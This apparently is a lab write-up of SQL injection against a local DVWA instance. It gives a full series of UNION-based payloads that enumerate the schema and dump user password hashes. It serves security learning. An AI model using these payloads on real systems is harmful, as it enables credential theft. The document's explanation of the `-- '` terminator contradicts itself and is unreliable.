## Vulnerability Selected: SQL Injection (OWASP A03:2021)
**Target:** DVWA `http://localhost:8082/vulnerabilities/sqli/`  
**Backend:** MariaDB `10.1.26-MariaDB-0+deb9u1`  
**Parameter:** `id` (GET)

---

## Payload Progression

### Phase 1 — Confirming Vulnerability (Error-Based)

- **First payload tried:** `'` (single quote)
- **URL:** `http://localhost:8082/vulnerabilities/sqli/?id='&Submit=Submit`
- **What happened:** MariaDB returned a raw syntax error:
  ```
  You have an error in your SQL syntax; check the manual that corresponds to
  your MariaDB server version for the right syntax to use near ''''' at line 1
  ```
- **What this confirmed:** The `id` parameter was directly interpolated into the SQL query with zero sanitization — the single quote broke the query structure, confirming classic string-context injection.

---

### Phase 2 — Column Enumeration (First Real Failure)

- **Goal:** Determine the number of columns before attempting UNION SELECT — a UNION query must return the same number of columns as the original query or it throws an error.
- **Payload sequence tried:**
  - `1' ORDER BY 1-- '` → No error ✅
  - `1' ORDER BY 2-- '` → No error ✅
  - `1' ORDER BY 3-- '` → **Error** ❌

- **What failed first — the comment terminator:**
  - Initial attempt used `#` as the comment: `1' ORDER BY 1#`
  - This produced a syntax error on the DVWA form because the `#` character was URL-encoded by the browser to `%23`, breaking the intended comment
  - **The moment of understanding:** Switching to `-- '` (double-dash space, trailing quote) worked because the trailing `'` after the comment marker closed the dangling quote from the original query string — the backend query was `WHERE user_id = '$id'`, so our injected `-- '` needed to neutralize the closing quote, not just comment the rest of the line
  - This is the single most important syntax insight of the entire exercise: `-- '` is not decoration — it is deliberately closing what the original query opened

- **Confirmed:** Query returns exactly **2 columns** (error only appeared at `ORDER BY 3`)

---

### Phase 3 — UNION SELECT (Second Failure and Fix)

- **First UNION attempt:** `1' union select 1,2 -- '`
- **What failed:** Output showed *two* rows — Gordon Brown's real record AND the injected `1, 2` row — making the injected output hard to isolate visually
- **Adjustment:** Switched base ID to `2` (a valid user — Gordon Brown) so the real row and injected row were clearly separated in the output
- **Final UNION confirm payload:** `2' union select 1,2 -- '`
- **Result:** Both column positions (`1` and `2`) reflected in First Name and Surname fields respectively — UNION-based extraction confirmed viable

---

### Phase 4 — Progressive Data Extraction

Each payload below built on the confirmed 2-column UNION structure:

| Step | Payload | What It Returned |
|:---:|:---|:---|
| 4 | `2' union select database(), user() -- '` | `dvwa` / `app@localhost` |
| 5 | `2' union select version(), database() -- '` | `10.1.26-MariaDB-0+deb9u1` / `dvwa` |
| 6 | `2' union SELECT schema_name, 2 FROM information_schema.schemata -- '` | 4 databases: `information_schema`, `dvwa`, `mysql`, `performance_schema` |
| 7 | `2' union SELECT table_name, 2 FROM information_schema.tables WHERE table_schema = 'dvwa' -- '` | `guestbook`, `users` |
| 8 | `2' union SELECT column_name, column_type FROM information_schema.columns WHERE table_schema = 'dvwa' and table_name = 'users' -- '` | All 8 columns; `password` is `varchar(32)` → **MD5 confirmed** |

- **Key observation at Step 8:** The `password` column is defined as `varchar(32)` — exactly 32 characters — which is the fixed length of an unsalted MD5 hash. This told us before even dumping any hash that the passwords would be instantly crackable via rainbow tables.

---

### Phase 5 — Final Credential Dump

- **Working payload:**
  ```
  2' union select user, password FROM users -- '
  ```
- **Result:** All 5 credentials extracted with MD5 hashes:

|:---|:---|:---|

## The Critical Moment of Understanding

> The most important failure in this exercise was not a wrong payload — it was **not understanding what the comment terminator was actually doing**.

- My first instinct was to use `#` to comment out the rest of the query (valid in MySQL)
- When that failed due to browser URL-encoding (`#` → `%23`), I switched to `-- `
- But even `-- ` alone caused a syntax error because the original backend query was:
  ```sql
  WHERE user_id = '$id'
  ```
  — the closing `'` after `$id` was still live and unpaired after my injection
- The fix was `-- '` — the trailing quote after the comment marker does not get executed (it is inside the comment), but its presence **satisfies the parser's expectation** when the query is being constructed
- Once I understood this, every subsequent payload worked on the first try because I always closed the quote correctly
